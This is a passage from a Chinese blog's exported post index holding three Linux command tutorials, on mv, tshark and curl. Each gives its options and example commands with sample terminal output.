    <content type="text"><![CDATA[Linux 基础命令- mv&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;mv命令是move的缩写，可以用来移动文件或者将文件改名（move (rename) files），是Linux系统下常用的命令，经常用来备份文件或者目录。 1．命令格式：1mv [选项] [源文件或目录] [目标文件或目录] 2．命令功能：&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;视mv命令中第二个参数类型的不同（是目标文件还是目标目录），mv命令将文件重命名或将其移至一个新的目录中。当第二个参数类型是文件时，mv命令完成文件重命名，此时，源文件只能有一个（也可以是源目录名），它将所给的源文件或目录重命名为给定的目标文件名。当第二个参数是已存在的目录名称时，源文件或目录参数可以有多个，mv命令将各参数指定的源文件均移至目标目录中。在跨文件系统移动文件时，mv先拷贝，再将原有文件删除，而链至该文件的链接也将丢失。 3．命令参数： -b ：若需覆盖文件，则覆盖前先行备份。 -f ：force 强制的意思，如果目标文件已经存在，不会询问而直接覆盖； -i ：若目标文件 (destination) 已经存在时，就会询问是否覆盖！ -u ：若目标文件已经存在，且 source 比较新，才会更新(update) -t ： –target-directory=DIRECTORY move all SOURCE arguments into DIRECTORY，即指定mv的目标目录，该选项适用于移动多个源文件到一个目录的情况，此时目标目录在前，源文件在后。 4．命令实例：实例1：文件改名&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令： 1mv test.log test1.txt &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出： 12345678910111213[root@localhost test]# ll总计 20drwxr-xr-x 6 root root 4096 10-27 01:58 scfdrwxrwxrwx 2 root root 4096 10-25 17:46 test3drwxr-xr-x 2 root root 4096 10-25 17:56 test4drwxr-xr-x 3 root root 4096 10-25 17:56 test5-rw-r--r-- 1 root root 16 10-28 06:04 test.log[root@localhost test]# mv test.log test1.txt[root@localhost test]# ll总计 20drwxr-xr-x 6 root root 4096 10-27 01:58 scf-rw-r--r-- 1 root root 16 10-28 06:04 test1.txtdrwxrwxrwx 2 root root 4096 10-25 17:46 test3drwxr-xr-x 2 root root 4096 10-25 17:56 test4drwxr-xr-x 3 root root 4096 10-25 17:56 test5 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明：&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;将文件test.log重命名为test1.txt 实例2：移动文件&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令： 1mv test1.txt test3 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出： 1234567891011121314151617[root@localhost test]# ll总计 20drwxr-xr-x 6 root root 4096 10-27 01:58 scf-rw-r--r-- 1 root root 29 10-28 06:05 test1.txtdrwxrwxrwx 2 root root 4096 10-25 17:46 test3drwxr-xr-x 2 root root 4096 10-25 17:56 test4drwxr-xr-x 3 root root 4096 10-25 17:56 test5[root@localhost test]# mv test1.txt test3[root@localhost test]# ll总计 16drwxr-xr-x 6 root root 4096 10-27 01:58 scfdrwxrwxrwx 2 root root 4096 10-28 06:09 test3drwxr-xr-x 2 root root 4096 10-25 17:56 test4drwxr-xr-x 3 root root 4096 10-25 17:56 test5[root@localhost test]# cd test3[root@localhost test3]# ll总计 4-rw-r--r-- 1 root root 29 10-28 06:05 test1.txt[root@localhost test3]# &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明：&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;将test1.txt文件移到目录test3中 实例3：将文件log1.txt,log2.txt,log3.txt移动到目录test3中。&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令： 12mv log1.txt log2.txt log3.txt test3mv -t /opt/soft/test/test4/ log1.txt log2.txt log3.txt &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出： 123456789101112131415161718192021222324252627282930313233[root@localhost test]# ll总计 28-rw-r--r-- 1 root root 8 10-28 06:15 log1.txt-rw-r--r-- 1 root root 12 10-28 06:15 log2.txt-rw-r--r-- 1 root root 13 10-28 06:16 log3.txtdrwxrwxrwx 2 root root 4096 10-28 06:09 test3[root@localhost test]# mv log1.txt log2.txt log3.txt test3[root@localhost test]# ll总计 16drwxrwxrwx 2 root root 4096 10-28 06:18 test3[root@localhost test]# cd test3/[root@localhost test3]# ll总计 16-rw-r--r-- 1 root root 8 10-28 06:15 log1.txt-rw-r--r-- 1 root root 12 10-28 06:15 log2.txt-rw-r--r-- 1 root root 13 10-28 06:16 log3.txt-rw-r--r-- 1 root root 29 10-28 06:05 test1.txt[root@localhost test3]#[root@localhost test3]# ll总计 20-rw-r--r-- 1 root root 8 10-28 06:15 log1.txt-rw-r--r-- 1 root root 12 10-28 06:15 log2.txt-rw-r--r-- 1 root root 13 10-28 06:16 log3.txtdrwxr-xr-x 2 root root 4096 10-28 06:21 logs-rw-r--r-- 1 root root 29 10-28 06:05 test1.txt[root@localhost test3]# mv -t /opt/soft/test/test4/ log1.txt log2.txt log3.txt [root@localhost test3]# cd ..[root@localhost test]# cd test4/[root@localhost test4]# ll总计 12-rw-r--r-- 1 root root 8 10-28 06:15 log1.txt-rw-r--r-- 1 root root 12 10-28 06:15 log2.txt-rw-r--r-- 1 root root 13 10-28 06:16 log3.txt[root@localhost test4]# &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明：&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;mv log1.txt log2.txt log3.txt test3 命令将log1.txt ，log2.txt， log3.txt 三个文件移到 test3目录中去，mv -t /opt/soft/test/test4/ log1.txt log2.txt log3.txt 命令又将三个文件移动到test4目录中去 实例4：将文件file1改名为file2，如果file2已经存在，则询问是否覆盖&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令： 1mv -i log1.txt log2.txt &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出： 1234567891011121314[root@localhost test4]# ll总计 12-rw-r--r-- 1 root root 8 10-28 06:15 log1.txt-rw-r--r-- 1 root root 12 10-28 06:15 log2.txt-rw-r--r-- 1 root root 13 10-28 06:16 log3.txt[root@localhost test4]# cat log1.txt odfdfs[root@localhost test4]# cat log2.txt ererwerwer[root@localhost test4]# mv -i log1.txt log2.txt mv：是否覆盖“log2.txt”? y[root@localhost test4]# cat log2.txt odfdfs[root@localhost test4]# 实例5：将文件file1改名为file2，即使file2存在，也是直接覆盖掉&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令： 1mv -f log3.txt log2.txt &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出： 1234567891011121314151617181920212223[root@localhost test4]# ll总计 8-rw-r--r-- 1 root root 8 10-28 06:15 log2.txt-rw-r--r-- 1 root root 13 10-28 06:16 log3.txt[root@localhost test4]# cat log2.txt odfdfs[root@localhost test4]# cat log3cat: log3: 没有那个文件或目录[root@localhost test4]# ll总计 8-rw-r--r-- 1 root root 8 10-28 06:15 log2.txt-rw-r--r-- 1 root root 13 10-28 06:16 log3.txt[root@localhost test4]# cat log2.txt odfdfs[root@localhost test4]# cat log3.txt dfosdfsdfdss[root@localhost test4]# mv -f log3.txt log2.txt [root@localhost test4]# cat log2.txt dfosdfsdfdss[root@localhost test4]# ll总计 4-rw-r--r-- 1 root root 13 10-28 06:16 log2.txt[root@localhost test4]# &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明：&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;log3.txt的内容直接覆盖了log2.txt内容，-f 这是个危险的选项，使用的时候一定要保持头脑清晰，一般情况下最好不用加上它。 实例6：目录的移动&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令： 1mv dir1 dir2 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出： 1234567891011121314151617181920212223242526[root@localhost test4]# ll-rw-r--r-- 1 root root 13 10-28 06:16 log2.txt[root@localhost test4]# ll-rw-r--r-- 1 root root 13 10-28 06:16 log2.txt[root@localhost test4]# cd ..[root@localhost test]# lldrwxr-xr-x 6 root root 4096 10-27 01:58 scfdrwxrwxrwx 3 root root 4096 10-28 06:24 test3drwxr-xr-x 2 root root 4096 10-28 06:48 test4drwxr-xr-x 3 root root 4096 10-25 17:56 test5[root@localhost test]# cd test3[root@localhost test3]# lldrwxr-xr-x 2 root root 4096 10-28 06:21 logs-rw-r--r-- 1 root root 29 10-28 06:05 test1.txt[root@localhost test3]# cd ..[root@localhost test]# mv test4 test3[root@localhost test]# lldrwxr-xr-x 6 root root 4096 10-27 01:58 scfdrwxrwxrwx 4 root root 4096 10-28 06:54 test3drwxr-xr-x 3 root root 4096 10-25 17:56 test5[root@localhost test]# cd test3/[root@localhost test3]# lldrwxr-xr-x 2 root root 4096 10-28 06:21 logs-rw-r--r-- 1 root root 29 10-28 06:05 test1.txtdrwxr-xr-x 2 root root 4096 10-28 06:48 test4[root@localhost test3]# &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明：&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果目录dir2不存在，将目录dir1改名为dir2；否则，将dir1移动到dir2中。 实例7：移动当前文件夹下的所有文件到上一级目录&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令： 1mv * ../ &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出： 123456789101112[root@localhost test4]# ll-rw-r--r-- 1 root root 25 10-28 07:02 log1.txt-rw-r--r-- 1 root root 13 10-28 06:16 log2.txt[root@localhost test4]# mv * ../[root@localhost test4]# ll[root@localhost test4]# cd ..[root@localhost test3]# ll-rw-r--r-- 1 root root 25 10-28 07:02 log1.txt-rw-r--r-- 1 root root 13 10-28 06:16 log2.txtdrwxr-xr-x 2 root root 4096 10-28 06:21 logs-rw-r--r-- 1 root root 29 10-28 06:05 test1.txtdrwxr-xr-x 2 root root 4096 10-28 07:02 test4 实例8：把当前目录的一个子目录里的文件移动到另一个子目录里&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令： 1mv test3/*.txt test5 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出： 12345678910111213141516171819202122232425[root@localhost test]# lldrwxr-xr-x 6 root root 4096 10-27 01:58 scfdrwxrwxrwx 4 root root 4096 10-28 07:02 test3drwxr-xr-x 3 root root 4096 10-25 17:56 test5[root@localhost test]# cd test3[root@localhost test3]# ll-rw-r--r-- 1 root root 25 10-28 07:02 log1.txt-rw-r--r-- 1 root root 13 10-28 06:16 log2.txtdrwxr-xr-x 2 root root 4096 10-28 06:21 logs-rw-r--r-- 1 root root 29 10-28 06:05 test1.txtdrwxr-xr-x 2 root root 4096 10-28 07:02 test4[root@localhost test3]# cd ..[root@localhost test]# mv test3/*.txt test5[root@localhost test]# cd test5[root@localhost test5]# ll-rw-r--r-- 1 root root 25 10-28 07:02 log1.txt-rw-r--r-- 1 root root 13 10-28 06:16 log2.txt-rw-r--r-- 1 root root 29 10-28 06:05 test1.txtdrwxr-xr-x 2 root root 4096 10-25 17:56 test5-1[root@localhost test5]# cd ..[root@localhost test]# cd test3/[root@localhost test3]# lldrwxr-xr-x 2 root root 4096 10-28 06:21 logsdrwxr-xr-x 2 root root 4096 10-28 07:02 test4[root@localhost test3]# 实例9：文件被覆盖前做简单备份，前面加参数-b&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令： 1mv log1.txt -b log2.txt &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出： 12345678910111213[root@localhost test5]# ll-rw-r--r-- 1 root root 25 10-28 07:02 log1.txt-rw-r--r-- 1 root root 13 10-28 06:16 log2.txt-rw-r--r-- 1 root root 29 10-28 06:05 test1.txtdrwxr-xr-x 2 root root 4096 10-25 17:56 test5-1[root@localhost test5]# mv log1.txt -b log2.txtmv：是否覆盖“log2.txt”? y[root@localhost test5]# ll-rw-r--r-- 1 root root 25 10-28 07:02 log2.txt-rw-r--r-- 1 root root 13 10-28 06:16 log2.txt~-rw-r--r-- 1 root root 29 10-28 06:05 test1.txtdrwxr-xr-x 2 root root 4096 10-25 17:56 test5-1[root@localhost test5]# &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;-b 不接受参数，mv会去读取环境变量VERSION_CONTROL来作为备份策略。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;–backup该选项指定如果目标文件存在时的动作，共有四种备份策略： CONTROL=none或off : 不备份。 CONTROL=numbered或t：数字编号的备份 CONTROL=existing或nil：如果存在以数字编号的备份，则继续编号备份m+1…n：执行mv操作前已存在以数字编号的文件log2.txt.~1~，那么再次执行将产生log2.txt~2~，以次类推。如果之前没有以数字编号的文件，则使用下面讲到的简单备份。 CONTROL=simple或never：使用简单备份：在被覆盖前进行了简单备份，简单备份只能有一份，再次被覆盖时，简单备份也会被覆盖。]]></content>
      <tags>
        <tag>Linux命令</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 命令- tshark]]></title>
    <url>%2F2017%2F08%2F14%2F2.%20Linux%20%E5%91%BD%E4%BB%A4%2F80.%20Linux%20%E5%91%BD%E4%BB%A4-%20tshark%2F</url>
    <content type="text"><![CDATA[Linux 命令- tshark&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在Linux下，当我们需要抓取网络数据包分析时，通常是使用tcpdump抓取网络raw数据包存到一个文件，然后下载到本地使用wireshark界面网络分析工具进行网络包分析。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;最近才发现，原来wireshark也提供有Linux命令行工具-tshark。tshark不仅有抓包的功能，还带了解析各种协议的能力。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;tshark是wireshark安装目录下命令行工具 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;使用tshark可以通过自动化方式调用wireshark &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;默认机器上是没有安装这个工具的。使用yum安装 1yum install -y wireshark &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;也可以到官网下载源码，具体安装方法 命令参数1. 抓包接口类 -i 设置抓包的网络接口，不设置则默认为第一个非自环接口。 -D 列出当前存在的网络接口。在不了解OS所控制的网络设备时，一般先用“tshark -D”查看网络接口的编号以供-i参数使用。 -f 设定抓包过滤表达式（capture filter expression）。抓包过滤表达式的写法雷同于tcpdump，可参考tcpdump man page的有关部分。 -s 设置每个抓包的大小，默认为65535，多于这个大小的数据将不会被程序记入内存、写入文件。（这个参数相当于tcpdump的-s，tcpdump默认抓包的大小仅为68） -p 设置网络接口以非混合模式工作，即只关心和本机有关的流量。 -B 设置内核缓冲区大小，仅对windows有效。 -y 设置抓包的数据链路层协议，不设置则默认为-L找到的第一个协议，局域网一般是EN10MB等。 -L 列出本机支持的数据链路层协议，供-y参数使用。 2. 抓包停止条件 -c 抓取的packet数，在处理一定数量的packet后，停止抓取，程序退出。 -a 设置tshark抓包停止向文件书写的条件，事实上是tshark在正常启动之后停止工作并返回的条件。条件写为test:value的形式，如“-a duration:5”表示tshark启动后在5秒内抓包然后停止；“-a filesize:10”表示tshark在输出文件达到10kB后停止；“-a files:n”表示tshark在写满n个文件后停止。（windows版的tshark0.99.3用参数“-a files:n”不起作用——会有无数多个文件生成。由于-b参数有自己的files参数，所谓“和-b的其它参数结合使用”无从说起。这也许是一个bug，或tshark的man page的书写有误。） 3. 文件输出控制 -b 设置ring buffer文件参数。ring buffer的文件名由-w参数决定。-b参数采用test:value的形式书写。“-b duration:5”表示每5秒写下一个ring buffer文件；“-b filesize:5”表示每达到5kB写下一个ring buffer文件；“-b files:7”表示ring buffer文件最多7个，周而复始地使用，如果这个参数不设定，tshark会将磁盘写满为止。 4. 文件输入 -r 设置tshark分析的输入文件。tshark既可以抓取分析即时的网络流量，又可以分析dump在文件中的数据。-r不能是命名管道和标准输入。 5. 处理类 -R 设置读取（显示）过滤表达式（read filter expression）。不符合此表达式的流量同样不会被写入文件。注意，读取（显示）过滤表达式的语法和底层相关的抓包过滤表达式语法不相同，它的语法表达要丰富得多，请参考http://www.ethereal.com/docs/dfref/和http://www.ethereal.com/docs/man-pages/ethereal-filter.4.html。类似于抓包过滤表达式，在命令行使用时最好将它们quote起来。 -n 禁止所有地址名字解析（默认为允许所有）。 -N 启用某一层的地址名字解析。“m”代表MAC层，“n”代表网络层，“t”代表传输层，“C”代表当前异步DNS查找。如果-n和-N参数同时存在，-n将被忽略。如果-n和-N参数都不写，则默认打开所有地址名字解析。 -d 将指定的数据按有关协议解包输出。如要将tcp 8888端口的流量按http解包，应该写为“-d tcp.port==8888,http”。注意选择子和解包协议之间不能留空格。 6. 输出类 -w 设置raw数据的输出文件。这个参数不设置，tshark将会把解码结果输出到stdout。“-w-”表示把raw输出到stdout。如果要把解码结果输出到文件，使用重定向“&gt;”而不要-w参数。 -F 设置输出raw数据的格式，默认为libpcap。“tshark -F”会列出所有支持的raw格式。 -V 设置将解码结果的细节输出，否则解码结果仅显示一个packet一行的summary。 -x 设置在解码输出结果中，每个packet后面以HEX dump的方式显示具体数据。 -T 设置解码结果输出的格式，包括text,ps,psml和pdml，默认为text。 -t 设置解码结果的时间格式。“ad”表示带日期的绝对时间，“a”表示不带日期的绝对时间，“r”表示从第一个包到现在的相对时间，“d”表示两个相邻包之间的增量时间（delta）。 -S 在向raw文件输出的同时，将解码结果打印到控制台。 -l 在处理每个包时即时刷新输出。 -X 扩展项。 -q 设置安静的stdout输出（例如做统计时） -z 设置统计参数。 7. 其它 -h 显示命令行帮助。 -v 显示tshark的版本信息。 -o 重载选项。 使用实例实例1：显示访问http请求的域名以及URI&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1tshark -n -t a -R http.request -T fields -e "frame.time" -e "ip.src" -e "http.host" -e "http.request.method" -e "http.request.uri" 实例2：抓取mysql的查询&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1tshark -n -i eth1 -R 'mysql.query' -T fields -e "ip.src" -e "mysql.query" &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;另外一种方法 1tshark -i eth1 port 3307 -d tcp.port==3307,mysql -z "proto,colinfo,mysql.query,mysql.query" 实例3：抓取指定类型的mysql查询&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1tshark -n -i eth1 -R 'mysql matches "SELECT|INSERT|DELETE|UPDATE"' -T fields -e "ip.src" -e "mysql.query" 实例4：统计http的状态&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1tshark -n -q -z http,stat, -z http,tree &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;注意：这个命令，直到ctrl+e才会显示出结果 实例5：tshark增加时间标签&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 12tshark -t adtshark -t a 实例6：查看当前服务器的web请求&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1tshark -n -t a -R http.request -T fields -e "frame.time" -e "ip.src" -e "http.host" -e "http.request.method" -e "http.request.uri" &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;tshark主要掌握这一个用法即可。这条命令用于web服务器，可以显示下面信息： 12345678[root@lnmp ~]# tshark -n -t a -R http.request -T fields -e "frame.time" -e "ip.src" -e "http.host" -e "http.request.method" -e "http.request.uri"Running as user "root" and group "root". This could be dangerous.Capturing on eth0Jul 13, 2017 22:00:25.129421639 192.168.0.100 prtas.videocc.net GET /v1/view?pid=1499954712122X1245558&amp;uid=04ad877579&amp;vid=04ad877579e0b8ab39e6eafe7709cdf6_0&amp;flow=12074276&amp;pd=1&amp;sd=89&amp;ts=1499954802350&amp;sign=3916b818465aa3ffcb7c81773bc8805f&amp;session_id=&amp;param1=&amp;param2=&amp;param3=&amp;param4=&amp;param5=&amp;cts=0&amp;duration=1004&amp;href=http%3A%2F%2Fv.apelearn.com%2Fstudent.php%3Fview_unit%3D897Jul 13, 2017 22:00:27.449646478 [FF02::C]:1900 M-SEARCH *Jul 13, 2017 22:00:31.449976172 [FF02::C]:1900 M-SEARCH *Jul 13, 2017 22:00:34.449975277 [FF02::C]:1900 M-SEARCH *Jul 13, 2017 22:00:35.194957223 192.168.0.100 prtas.videocc.net GET &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这类似于web访问日志，有时候若服务器没有配置访问日志，可以临时使用该命令查看一下当前服务器的web请求。]]></content>
      <tags>
        <tag>Linux命令</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 命令- curl]]></title>
    <url>%2F2017%2F08%2F14%2F2.%20Linux%20%E5%91%BD%E4%BB%A4%2F84.%20Linux%20%E5%91%BD%E4%BB%A4-%20curl%2F</url>
    <content type="text"><![CDATA[Linux 命令- curl&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;curl是Linux系统命令行下用来简单测试web访问的工具，是一个利用URL规则在命令行下工作的文件传输工具。它支持文件的上传和下载。 命令参数&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;curl命令参数很多。 -a/–append 上传文件时，附加到目标文件 -A:随意指定自己这次访问所宣称的自己的浏览器信息 -b/–cookie cookie字符串或文件读取位置，使用option来把上次的cookie信息追加到http request里面去。 -c/–cookie-jar 操作结束后把cookie写入到这个文件中 -C/–continue-at 断点续转 -d/–data HTTP POST方式传送数据 –data-ascii 以ascii的方式post数据 –data-binary 以二进制的方式post数据 –negotiate 使用HTTP身份验证 –digest 使用数字身份验证 –disable-eprt 禁止使用EPRT或LPRT –disable-epsv 禁止使用EPSV -D/–dump-header 把header信息写入到该文件中 –egd-file 为随机数据(SSL)设置EGD socket路径 –tcp-nodelay 使用TCP_NODELAY选项 -e/–referer 指定引用地址 -F/–form 模拟http表单提交数据 –form-string 模拟http表单提交数据 -G/–get 以get的方式来发送数据 -H/–header 指定请求头参数 –ignore-content-length 忽略的HTTP头信息的长度 -i/–include 输出时包括protocol头信息 -I/–head 仅返回头部信息，使用HEAD请求 -k/–insecure 允许不使用证书到SSL站点 -K/–config 指定的配置文件读取 -l/–list-only 列出ftp目录下的文件名称 –limit-rate 设置传输速度 –local-port 强制使用本地端口号 -m/–max-time 指定处理的最大时长 –max-redirs 设置最大读取的目录数 –max-filesize 设置最大下载的文件总量 -o/–output 指定输出文件名称 -O/–remote-name 把输出写到该文件中，保留远程文件的文件名 -v/–verbose 小写的v参数，用于打印更多信息，包括发送的请求信息，这在调试脚本是特别有用。 -s/–slient 减少输出的信息，比如进度 –connect-timeout 指定尝试连接的最大时长 -x/–proxy 指定代理服务器地址和端口，端口默认为1080 -u/–user 设置服务器的用户和密码 -r/–range 检索来自HTTP/1.1或FTP服务器字节范围 –range-file 读取（SSL）的随机文件 -R/–remote-time 在本地生成文件时，保留远程文件时间 –retry 指定重试次数 –retry-delay 传输出现问题时，设置重试间隔时间 –retry-max-time 传输出现问题时，设置最大重试时间 -s/–silent 静默模式。不输出任何东西 -S/–show-error 显示错误 –socks4 用socks4代理给定主机和端口 –socks5 用socks5代理给定主机和端口 –stderr -x/–proxy 在给定的端口上使用HTTP代理 -X/–request 指定什么命令。curl默认的HTTP动词是GET，使用-X参数可以支持其他动词。 -T/–upload-file 指定上传文件路径 命令功能&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;curl命令是一个功能强大的网络工具，它能够通过http、ftp等方式下载文件，也能够上传文件，同时支持HTTPS等众多协议，还支持POST、cookies、认证、从指定偏移处下载部分文件、用户代理字符串、限速、文件大小、进度条等特征。其实curl远不止前面所说的那些功能，大家可以通过man curl阅读手册页获取更多的信息。类似的工具还有wget。curl命令使用了libcurl库来实现，libcurl库常用在C程序中用来处理HTTP请求，curlpp是libcurl的一个C++封装，这几个东西可以用在抓取网页、网络监控等方面的开发，而curl命令可以帮助来解决开发过程中遇到的问题。 常用命令1.-x指定ip和端口，省略写hosts，方便使用1[root@localhost ~]# curl -xip:port www.baidu.com 2.-I可以把当前的内容略掉，只显示状态码，-v可以显示详细过程1[root@localhost ~]# curl -Iv http://www.qq.com 3.-u可以指定用户名和密码1[root@localhost ~]# curl -u user:password http://123.com 4.-O直接下载页面或者对象1[root@localhost ~]# curl http://study.lishiming.net/index.heml -O 5.-o自定义名字1[root@localhost ~]# curl -o index2 http://study.lishiming.net/index.heml 使用实例实例1：读取网页1curl http://www.linuxidc.com 实例2：保存网页-o：将文件保存为命令行中指定的文件名的文件中1curl -o page.html http://www.linuxidc.com.html -O：使用URL中默认的文件名保存文件到本地1curl -O http://linuxidc.com.html 其他：可以使用 &gt; 进行输出1curl http://www.linuxidc.com &gt; page.html 实例3：使用proxy服务器及其端口：-x1curl -x 123.45.67.89:1080 -o page.html http://www.linuxidc.com 实例4：使用cookie来记录session信息1curl -x 123.45.67.89:1080 -o page.html -D cookie0001.txt http://www.linuxidc.com &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这个option： -D是把http的response里面的cookie信息存到一个特别的文件中去， &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这样，当页面被存到page.html的同时，cookie信息也被存到了cookie0001.txt里面了 实例5：下次访问的时候，使用iption把上次的cookie信息追加到http request里面去：-b1curl -x 123.45.6789:1080 -o page1.html -D cookie0002.txt -b cookie0001.txt http://www.linuxidc.com 实例6：浏览器信息1curl -A "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)" -x 123.45.67.89:1080 -o page.html -D cookie0001.txt http://www.linuxidc.com 实例7：referer1curl -A "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)" -x 123.45.67.89:1080 -e "mail.linuxidc.com" -o page.html -D cookie0001.txt http://www.linuxidc.com &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这样就可以骗对方的服务器，你是从mail.linuxidc.com点击某个连接过来的。 实例8：下载文件12curl -o 1.jpg http://cgi2.tky.3web.ne.jp/~zzh/screen1.JPGcurl -O http://cgi2.tky.3web.ne.jp/~zzh/screen1.JPG &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;-O可以按照服务器上的文件名，自动存在本地 1curl -O http://cgi2.tky.3web.ne.jp/~zzh/screen[1-10].JPG 实例9：批量下载1curl -O http://cgi2.tky.3web.ne.jp/~&#123;zzh,nick&#125;/[001-201].JPG &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这样产生的下载就是： 12345678~zzh/001.JPG~zzh/002.JPG...~zzh/201.JPG~nick/001.JPG~nick/002.JPG...~nick/201.JPG &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;自定义文件名的批量下载 1curl -o #2_#1.jpg http://cgi2.tky.3web.ne.jp/~&#123;zzh,nick&#125;/[001-201].JPG &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这样，自定义出来下载下来的文件名就变成了这样： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;原来：~zzh/001.JPG –&gt; 下载后： 001-zzh.JPG 原来： ~nick/001.JPG –&gt; 下载后： 001-nick.JPG &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这样就不怕文件重名了。 实例10：断点续传1curl -c -O http://cgi2.tky.3wb.ne.jp/~zzh/screen1.JPG 实例11：使用-r 分块下载&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;比如有一个 http://cgi2.tky.2web.ne.jp/~zzh/zhao1.MP3 要下载。就可以用这样的命令： 1234curl -r 0-10240 -o "zhao.part1" http:/cgi2.tky.3web.ne.jp/~zzh/zhao1.MP3 &amp;\curl -r 10241-20480 -o "zhao.part1" http:/cgi2.tky.3web.ne.jp/~zzh/zhao1.MP3 &amp;\curl -r 20481-40960 -o "zhao.part1" http:/cgi2.tky.3web.ne.jp/~zzh/zhao1.MP3 &amp;\curl -r 40961- -o "zhao.part1" http:/cgi2.tky.3web.ne.jp/~zzh/zhao1.MP3 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这样就可以分块下载了。不过需要自己把这些破碎的文件合并起来，如果用UNIX或者苹果，用 cat zhao.part* &gt; zhao.MP3 就可以了；如果用的windows 用 copy /b 来解决。 实例12：使用FTP协议下载&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;上面都是http协议的下载，其实ftp也一样可以用。 1curl -u name:passwd ftp://ip:port/path/file &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;或者 1curl ftp://name:passwd@ip:port/path/file 实例13：使用-T上传向ftp传一个文件：1curl -T localfile -u name:passwd ftp://upload_site:port/path/ 向http服务器上传文件1curl -T localfile http://cgi2.tky.3web.ne.jp/~zzh/abc.cgi &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;注意，这个时候，使用协议是HTTP的PUT method 实例14：POST和GET模式&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说到PUT，自然还有其它几种methos，POST和GET 1curl http://www.linuxidc.com/login.cgi?user=nickwolfe&amp;password=12345 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;POST模式的option是-d 1curl -d "user=nickwolfe&amp;password=12345" http://www.linuxidc.com/login.cgi &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;需要注意的是，POST模式下的文件上传，比如一个HTTP表单，要用curl进行模拟，就该是: 1curl -F upload=@localfile -F nick=go http://cgi2.tky.3web.ne.jp/~zzh/up_file.cgi 实例15：http本地证书1curl -E localcert.pem https://remote_server 实例16：使用curl通过dict协议去查字典1curl dict://dict.org/d:computer 实例17：获取服务端的信息，比如获取web Server的类型（apache/nginx）以及版本，php的版本等等1curl -i http://example.com/ 实例18：curl指定用户以及密码访问&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;有时候，访问一个网页时是需要认证的，也就是说需要输入正确的用户名以及密码信息，否则会包401的错误 1curl -u user:password http://www.linuxidc.com/study/ &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这样就可以了 